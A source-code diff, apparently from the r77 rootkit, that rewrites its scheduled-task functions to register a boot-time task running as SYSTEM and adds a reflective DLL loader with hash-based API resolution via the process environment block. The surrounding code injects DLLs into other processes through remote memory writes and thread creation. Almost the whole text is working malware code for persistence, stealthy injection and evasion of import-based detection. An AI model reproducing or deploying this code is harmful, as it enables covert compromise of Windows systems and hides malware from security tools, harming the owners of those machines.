@@ -351,53 +351,92 @@ BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCW
 {
 	BOOL result = FALSE;
 
-	if (SUCCEEDED(CoInitialize(NULL)))
+	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
 	{
-		ITaskScheduler *taskScheduler = NULL;
-		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
+		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
+		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
 		{
-			ITask *task = NULL;
-			if (SUCCEEDED(taskScheduler->NewWorkItem(name, CLSID_CTask, IID_ITask, (IUnknown**)&task)))
+			ITaskService *service = NULL;
+			if (SUCCEEDED(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&service)))
 			{
-				if (SUCCEEDED(task->SetWorkingDirectory(directory)) &&
-					SUCCEEDED(task->SetApplicationName(fileName)) &&
-					SUCCEEDED(task->SetParameters(arguments)) &&
-					SUCCEEDED(task->SetAccountInformation(L"", NULL)))
+				if (SUCCEEDED(service->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t())))
 				{
-					WORD triggerId;
-					ITaskTrigger *trigger = NULL;
-					if (SUCCEEDED(task->CreateTrigger(&triggerId, &trigger)))
+					ITaskFolder *folder = NULL;
+					if (SUCCEEDED(service->GetFolder(_bstr_t(L"\\"), &folder)))
 					{
-						TASK_TRIGGER triggerDetails;
-						ZeroMemory(&triggerDetails, sizeof(TASK_TRIGGER));
-						triggerDetails.cbTriggerSize = sizeof(TASK_TRIGGER);
-						triggerDetails.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;
-						triggerDetails.wBeginDay = 1;
-						triggerDetails.wBeginMonth = 1;
-						triggerDetails.wBeginYear = 2000;
-
-						if (SUCCEEDED(trigger->SetTrigger(&triggerDetails)))
+						ITaskDefinition *task = NULL;
+						if (SUCCEEDED(service->NewTask(0, &task)))
 						{
-							IPersistFile *persistFile = NULL;
-							if (SUCCEEDED(task->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
+							ITaskSettings *settings = NULL;
+							if (SUCCEEDED(task->get_Settings(&settings)))
 							{
-								if (SUCCEEDED(persistFile->Save(NULL, TRUE)))
+								if (SUCCEEDED(settings->put_StartWhenAvailable(VARIANT_TRUE)))
 								{
-									result = TRUE;
+									ITriggerCollection *triggerCollection = NULL;
+									if (SUCCEEDED(task->get_Triggers(&triggerCollection)))
+									{
+										ITrigger *trigger = NULL;
+										if (SUCCEEDED(triggerCollection->Create(TASK_TRIGGER_BOOT, &trigger)))
+										{
+											IBootTrigger *bootTrigger = NULL;
+											if (SUCCEEDED(trigger->QueryInterface(IID_IBootTrigger, (LPVOID*)&bootTrigger)))
+											{
+												IActionCollection *actionCollection = NULL;
+												if (SUCCEEDED(task->get_Actions(&actionCollection)))
+												{
+													IAction *action = NULL;
+													if (SUCCEEDED(actionCollection->Create(TASK_ACTION_EXEC, &action)))
+													{
+														IExecAction *execAction = NULL;
+														if (SUCCEEDED(action->QueryInterface(IID_IExecAction, (LPVOID*)&execAction)))
+														{
+															if (SUCCEEDED(execAction->put_WorkingDirectory(_bstr_t(directory))) &&
+																SUCCEEDED(execAction->put_Path(_bstr_t(fileName))) &&
+																SUCCEEDED(execAction->put_Arguments(_bstr_t(arguments))))
+															{
+																VARIANT password;
+																password.vt = VT_EMPTY;
+
+																IRegisteredTask *registeredTask = NULL;
+																if (SUCCEEDED(folder->RegisterTaskDefinition(_bstr_t(name), task, TASK_CREATE_OR_UPDATE, _variant_t(L"SYSTEM"), password, TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""), &registeredTask)))
+																{
+																	result = TRUE;
+
+																	registeredTask->Release();
+																}
+															}
+
+															execAction->Release();
+														}
+
+														action->Release();
+													}
+
+													actionCollection->Release();
+												}
+
+												bootTrigger->Release();
+											}
+
+											trigger->Release();
+										}
+
+										triggerCollection->Release();
+									}
 								}
 
-								persistFile->Release();
+								settings->Release();
 							}
+
+							task->Release();
 						}
 
-						trigger->Release();
+						folder->Release();
 					}
 				}
 
-				task->Release();
+				service->Release();
 			}
-
-			taskScheduler->Release();
 		}
 
 		CoUninitialize();
@@ -409,23 +448,42 @@ BOOL RunScheduledTask(LPCWSTR name)
 {
 	BOOL result = FALSE;
 
-	if (SUCCEEDED(CoInitialize(NULL)))
+	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
 	{
-		ITaskScheduler *taskScheduler = NULL;
-		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
+		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
+		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
 		{
-			ITask *task = NULL;
-			if (SUCCEEDED(taskScheduler->Activate(name, IID_ITask, (IUnknown**)&task)))
+			ITaskService *service = NULL;
+			if (SUCCEEDED(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&service)))
 			{
-				if (SUCCEEDED(task->Run()))
+				if (SUCCEEDED(service->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t())))
 				{
-					result = TRUE;
+					ITaskFolder *folder = NULL;
+					if (SUCCEEDED(service->GetFolder(_bstr_t(L"\\"), &folder)))
+					{
+						IRegisteredTask *task = NULL;
+						if (SUCCEEDED(folder->GetTask(_bstr_t(name), &task)))
+						{
+							VARIANT params;
+							params.vt = VT_EMPTY;
+
+							IRunningTask *runningTask = NULL;
+							if (SUCCEEDED(task->Run(params, &runningTask)))
+							{
+								result = TRUE;
+
+								runningTask->Release();
+							}
+
+							task->Release();
+						}
+
+						folder->Release();
+					}
 				}
 
-				task->Release();
+				service->Release();
 			}
-
-			taskScheduler->Release();
 		}
 
 		CoUninitialize();
@@ -437,17 +495,30 @@ BOOL DeleteScheduledTask(LPCWSTR name)
 {
 	BOOL result = FALSE;
 
-	if (SUCCEEDED(CoInitialize(NULL)))
+	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
 	{
-		ITaskScheduler *taskScheduler = NULL;
-		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
+		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
+		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
 		{
-			if (SUCCEEDED(taskScheduler->Delete(name)))
+			ITaskService *service = NULL;
+			if (SUCCEEDED(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&service)))
 			{
-				result = TRUE;
-			}
+				if (SUCCEEDED(service->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t())))
+				{
+					ITaskFolder *folder = NULL;
+					if (SUCCEEDED(service->GetFolder(_bstr_t(L"\\"), &folder)))
+					{
+						if (SUCCEEDED(folder->DeleteTask(_bstr_t(name), 0)))
+						{
+							result = TRUE;
+						}
 
-			taskScheduler->Release();
+						folder->Release();
+					}
+				}
+
+				service->Release();
+			}
 		}
 
 		CoUninitialize();
@@ -506,6 +577,43 @@ BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
 	}
 
 	return FALSE;
+}
+LPVOID PebGetProcAddress(DWORD moduleHash, DWORD functionHash)
+{
+#ifdef _WIN64
+	nt::PPEB_LDR_DATA peb = (nt::PPEB_LDR_DATA)((nt::PPEB)__readgsqword(0x60))->Ldr;
+#else
+	nt::PPEB_LDR_DATA peb = (nt::PPEB_LDR_DATA)((nt::PPEB)__readfsdword(0x30))->Ldr;
+#endif
+
+	nt::PLDR_DATA_TABLE_ENTRY firstPebEntry = (nt::PLDR_DATA_TABLE_ENTRY)peb->InMemoryOrderModuleList.Flink;
+	nt::PLDR_DATA_TABLE_ENTRY pebEntry = firstPebEntry;
+	do
+	{
+		// Find module by hash
+		if (pebEntry->BaseDllName.Buffer && libc::strhashi((LPCSTR)pebEntry->BaseDllName.Buffer, pebEntry->BaseDllName.Length) == moduleHash)
+		{
+			LPBYTE dllBase = (LPBYTE)pebEntry->DllBase;
+			PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
+			PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+			LPDWORD nameDirectory = (LPDWORD)(dllBase + exportDirectory->AddressOfNames);
+			LPWORD nameOrdinalDirectory = (LPWORD)(dllBase + exportDirectory->AddressOfNameOrdinals);
+
+			// Find function by hash
+			for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++, nameDirectory++, nameOrdinalDirectory++)
+			{
+				if (libc::strhash((LPCSTR)(dllBase + *nameDirectory)) == functionHash)
+				{
+					return dllBase + *(LPDWORD)(dllBase + exportDirectory->AddressOfFunctions + *nameOrdinalDirectory * sizeof(DWORD));
+				}
+			}
+
+			return NULL;
+		}
+	}
+	while ((pebEntry = (nt::PLDR_DATA_TABLE_ENTRY)pebEntry->InMemoryOrderModuleList.Flink) != firstPebEntry);
+
+	return NULL;
 }
 BOOL RunPE(LPCWSTR path, LPBYTE payload)
 {
@@ -617,7 +725,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 					if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
 					{
 						// Get function pointer to the shellcode that loads the DLL reflectively.
-						DWORD entryPoint = GetReflectiveDllMain(dll);
+						DWORD entryPoint = GetExecutableFunction(dll, "ReflectiveDllMain");
 						if (entryPoint)
 						{
 							LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -626,7 +734,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 								if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
 								{
 									HANDLE thread = NULL;
-									if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)(allocatedMemory + entryPoint), allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
+									if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
 									{
 										if (fast)
 										{
@@ -660,21 +768,21 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 
 	return result;
 }
-DWORD GetReflectiveDllMain(LPBYTE dll)
+DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName)
 {
 	BOOL is64Bit;
-	if (IsExecutable64Bit(dll, &is64Bit) && is64Bit == (sizeof(LPVOID) == 8))
+	if (IsExecutable64Bit(image, &is64Bit) && is64Bit == (sizeof(LPVOID) == 8))
 	{
-		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
-		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dll + RvaToOffset(dll, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
-		LPDWORD nameDirectory = (LPDWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNames));
-		LPWORD nameOrdinalDirectory = (LPWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNameOrdinals));
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image + RvaToOffset(image, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
+		LPDWORD nameDirectory = (LPDWORD)(image + RvaToOffset(image, exportDirectory->AddressOfNames));
+		LPWORD nameOrdinalDirectory = (LPWORD)(image + RvaToOffset(image, exportDirectory->AddressOfNameOrdinals));
 
 		for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++)
 		{
-			if (strstr((PCHAR)(dll + RvaToOffset(dll, *nameDirectory)), "ReflectiveDllMain"))
+			if (strstr((PCHAR)(image + RvaToOffset(image, *nameDirectory)), functionName))
 			{
-				return RvaToOffset(dll, *(LPDWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfFunctions) + *nameOrdinalDirectory * sizeof(DWORD)));
+				return RvaToOffset(image, *(LPDWORD)(image + RvaToOffset(image, exportDirectory->AddressOfFunctions) + *nameOrdinalDirectory * sizeof(DWORD)));
 			}
 
 			nameDirectory++;
@@ -684,9 +792,9 @@ DWORD GetReflectiveDllMain(LPBYTE dll)
 
 	return 0;
 }
-DWORD RvaToOffset(LPBYTE dll, DWORD rva)
+DWORD RvaToOffset(LPBYTE image, DWORD rva)
 {
-	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
 	PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
 
 	if (rva < sections[0].PointerToRawData)
@@ -1038,7 +1146,7 @@ BOOL DetachInjectedProcess(const R77_PROCESS &r77Process)
 		{
 			// R77_PROCESS.DetachAddress is a function pointer to Rootkit::Detach
 			HANDLE thread = NULL;
-			if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)r77Process.DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
+			if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Process.DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
 			{
 				result = TRUE;
 				CloseHandle(thread);
@@ -1424,6 +1532,107 @@ VOID ControlPipeListener(CONTROLCALLBACK callback)
 	CreateThread(NULL, 0, ControlPipeListenerThread, callback, 0, NULL);
 }
 
+#ifdef EXPORT_REFLECTIVE_DLL_MAIN
+BOOL WINAPI ReflectiveDllMain(LPBYTE dllBase)
+{
+	// All functions that are used in the reflective loader must be found by searching the PEB.
+	// Functions, such as memcpy need to be handwritten, because no functions are imported, yet.
+	// Switch statements cannot be used, because a jump table would be created and the shellcode would not be position independent anymore.
+
+	nt::NTFLUSHINSTRUCTIONCACHE ntFlushInstructionCache = (nt::NTFLUSHINSTRUCTIONCACHE)PebGetProcAddress(0x3cfa685d, 0x534c0ab8);
+	nt::LOADLIBRARYA loadLibraryA = (nt::LOADLIBRARYA)PebGetProcAddress(0x6a4abc5b, 0xec0e4e8e);
+	nt::GETPROCADDRESS getProcAddress = (nt::GETPROCADDRESS)PebGetProcAddress(0x6a4abc5b, 0x7c0dfcaa);
+	nt::VIRTUALALLOC virtualAlloc = (nt::VIRTUALALLOC)PebGetProcAddress(0x6a4abc5b, 0x91afca54);
+
+	// Safety check: Continue only, if all functions were found.
+	if (ntFlushInstructionCache && loadLibraryA && getProcAddress && virtualAlloc)
+	{
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
+
+		// Allocate memory for the DLL.
+		LPBYTE allocatedMemory = (LPBYTE)virtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (allocatedMemory)
+		{
+			// Copy optional header to new memory.
+			libc::memcpy(allocatedMemory, dllBase, ntHeaders->OptionalHeader.SizeOfHeaders);
+
+			// Copy sections to new memory.
+			PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
+			for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+			{
+				libc::memcpy(allocatedMemory + sections[i].VirtualAddress, dllBase + sections[i].PointerToRawData, sections[i].SizeOfRawData);
+			}
+
+			// Read the import directory, call LoadLibraryA to import dependencies and patch the IAT.
+			PIMAGE_DATA_DIRECTORY importDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+			if (importDirectory->Size)
+			{
+				for (PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(allocatedMemory + importDirectory->VirtualAddress); importDescriptor->Name; importDescriptor++)
+				{
+					LPBYTE module = (LPBYTE)loadLibraryA((LPCSTR)(allocatedMemory + importDescriptor->Name));
+					if (module)
+					{
+						PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(allocatedMemory + importDescriptor->OriginalFirstThunk);
+						PUINT_PTR importAddressTable = (PUINT_PTR)(allocatedMemory + importDescriptor->FirstThunk);
+
+						while (*importAddressTable)
+						{
+							if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
+							{
+								PIMAGE_NT_HEADERS moduleNtHeaders = (PIMAGE_NT_HEADERS)(module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
+								PIMAGE_EXPORT_DIRECTORY moduleExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(module + moduleNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+								*importAddressTable = (UINT_PTR)(module + *(LPDWORD)(module + moduleExportDirectory->AddressOfFunctions + (IMAGE_ORDINAL(thunk->u1.Ordinal) - moduleExportDirectory->Base) * sizeof(DWORD)));
+							}
+							else
+							{
+								importDirectory = (PIMAGE_DATA_DIRECTORY)(allocatedMemory + *importAddressTable);
+								*importAddressTable = (UINT_PTR)getProcAddress((HMODULE)module, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)importDirectory)->Name);
+							}
+
+							thunk = (PIMAGE_THUNK_DATA)((LPBYTE)thunk + sizeof(UINT_PTR));
+							importAddressTable = (PUINT_PTR)((LPBYTE)importAddressTable + sizeof(UINT_PTR));
+						}
+					}
+				}
+			}
+
+			// Patch relocations.
+			PIMAGE_DATA_DIRECTORY relocationDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+			if (relocationDirectory->Size)
+			{
+				UINT_PTR imageBase = (UINT_PTR)(allocatedMemory - ntHeaders->OptionalHeader.ImageBase);
+
+				for (PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(allocatedMemory + relocationDirectory->VirtualAddress); baseRelocation->SizeOfBlock; baseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)baseRelocation + baseRelocation->SizeOfBlock))
+				{
+					LPBYTE relocationAddress = allocatedMemory + baseRelocation->VirtualAddress;
+					nt::PIMAGE_RELOC relocations = (nt::PIMAGE_RELOC)((LPBYTE)baseRelocation + sizeof(IMAGE_BASE_RELOCATION));
+
+					for (UINT_PTR i = 0; i < (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(nt::IMAGE_RELOC); i++)
+					{
+						if (relocations[i].Type == IMAGE_REL_BASED_DIR64) *(PUINT_PTR)(relocationAddress + relocations[i].Offset) += imageBase;
+						else if (relocations[i].Type == IMAGE_REL_BASED_HIGHLOW) *(LPDWORD)(relocationAddress + relocations[i].Offset) += (DWORD)imageBase;
+						else if (relocations[i].Type == IMAGE_REL_BASED_HIGH) *(LPWORD)(relocationAddress + relocations[i].Offset) += HIWORD(imageBase);
+						else if (relocations[i].Type == IMAGE_REL_BASED_LOW) *(LPWORD)(relocationAddress + relocations[i].Offset) += LOWORD(imageBase);
+					}
+				}
+			}
+
+			// Get actual main entry point.
+			nt::DLLMAIN dllMain = (nt::DLLMAIN)(allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+
+			// Flush instruction cache to avoid stale instructions on modified code to be executed.
+			ntFlushInstructionCache(INVALID_HANDLE_VALUE, NULL, 0);
+
+			// Call actual DllMain.
+			return dllMain((HINSTANCE)allocatedMemory, DLL_PROCESS_ATTACH, NULL);
+		}
+	}
+
+	// If loading failed, DllMain was not executed either. Return FALSE.
+	return FALSE;
+}
+#endif
+
 namespace nt
 {
 	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
@@ -1443,5 +1652,38 @@ namespace nt
 	NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb)
 	{
 		return ((nt::RTLSETPROCESSISCRITICAL)GetFunction("ntdll.dll", "RtlSetProcessIsCritical"))(newIsCritical, oldIsCritical, needScb);
+	}
+}
+
+namespace libc
+{
+	VOID memcpy(LPBYTE dest, LPBYTE src, DWORD size)
+	{
+		for (DWORD i = 0; i < size; i++)
+		{
+			*dest++ = *src++;
+		}
+	}
+	DWORD strhash(LPCSTR str)
+	{
+		DWORD hash = 0;
+
+		while (*str)
+		{
+			hash = ROTR(hash, 13) + *str++;
+		}
+
+		return hash;
+	}
+	DWORD strhashi(LPCSTR str, USHORT length)
+	{
+		DWORD hash = 0;
+
+		for (USHORT i = 0; i < length; i++)
+		{
+			hash = ROTR(hash, 13) + (str[i] >= 'a' ? str[i] - 0x20 : str[i]);
+		}
+
+		return hash;
 	}
 }
